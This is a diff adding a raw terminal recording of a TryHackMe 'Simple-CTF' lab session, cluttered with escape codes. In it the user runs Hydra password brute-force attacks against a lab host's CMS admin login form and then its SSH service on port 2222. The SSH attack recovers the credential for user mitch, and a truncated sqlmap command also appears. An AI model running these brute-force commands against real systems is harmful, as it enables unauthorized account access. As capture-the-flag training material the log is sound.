@@ -1,0 +1,63 @@
+Script started on 2020-11-20 11:41:16-03:00 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="166" LINES="39"]
+[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# 
+[?2004l[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# exitsqlmap -u http://10.10.168.186/simple/admin/login.php --dbshydra -v -I -l mitch -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt 10.10.168.186 http-post-form "/simple/admin/login.php:username=^USER^&password=^pass^&loginsubmit=submit:incorrect"
+[?2004lHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-20 11:41:21
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 499 login tries (l:1/p:499), ~32 tries per task
+[DATA] attacking http-post-form://10.10.168.186:80/simple/admin/login.php:username=^USER^&password=^pass^&loginsubmit=submit:incorrect
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] attack finished for 10.10.168.186 (waiting for children to complete tests)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-20 11:42:06
+[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# 
+[?2004l[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# hydra -v -I -l mitch -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt 10.10.168.186 http-post-form "/simple/admin/login.php:username=^USER^&password=^pass^&loginsubmit=submit:incorrect"
+[?2004lHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-20 11:46:59
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 499 login tries (l:1/p:499), ~32 tries per task
+[DATA] attacking http-post-form://10.10.168.186:80/simple/admin/login.php:username=^USER^&password=^pass^&loginsubmit=submit:incorrect
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[STATUS] attack finished for 10.10.168.186 (waiting for children to complete tests)
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-20 11:47:44
+[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# 
+[?2004l[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# hydra -v -I -l mitch -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt 10.10.168.186 http-post-form "/simple/admin/login.php:username=^USER^&password=^pass^&loginsubmit=submit:incorrect"[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[A]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# exit[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Chydra -v -I -l mitch -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt 10.10.168.186 http-post-form "/simple/admin/login.[A]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# [K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Chydra -v -I -l mitch -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt 10.10.168.186 http-post-form "/simple/admin/login.[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cs10.10.168.186[A]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cs10.10.168.186[A]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ch10.10.168.186[A]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C:10.10.168.186[A]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/10.10.168.186[A]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C/10.10.168.186[A]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# [C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+[?2004lHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-20 11:48:29
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 499 login tries (l:1/p:499), ~32 tries per task
+[DATA] attacking ssh://10.10.168.186:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://mitch@10.10.168.186:22
+^C[ERROR] Received signal 2, going down ...
+[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# hydra -v -I -l mitch -P /usr/share/seclists/Passwords/Common-Credentials/500-worst-passwords.txt ssh://10.10.168.186 -s 2222
+[?2004lHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-20 11:48:59
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 499 login tries (l:1/p:499), ~32 tries per task
+[DATA] attacking ssh://10.10.168.186:2222/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://mitch@10.10.168.186:2222
+[INFO] Successful, password authentication is supported by ssh://10.10.168.186:2222
+[ERROR] could not connect to target port 2222: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[ERROR] could not connect to target port 2222: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[ERROR] could not connect to target port 2222: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[ERROR] could not connect to target port 2222: Socket error: Connection reset by peer
+[ERROR] ssh protocol error
+[[1;32m2222[0m][[1;32mssh[0m] host: [1;32m10.10.168.186[0m   login: [1;32mmitch[0m   password: [1;32msecret[0m
+[STATUS] attack finished for 10.10.168.186 (waiting for children to complete tests)
+^C[ERROR] Received signal 2, going down ...
+[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# 
+[?2004l[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Simple-CTF[00m# exit
+[?2004lexit
+
+Script done on 2020-11-20 11:49:49-03:00 [COMMAND_EXIT_CODE="0"]
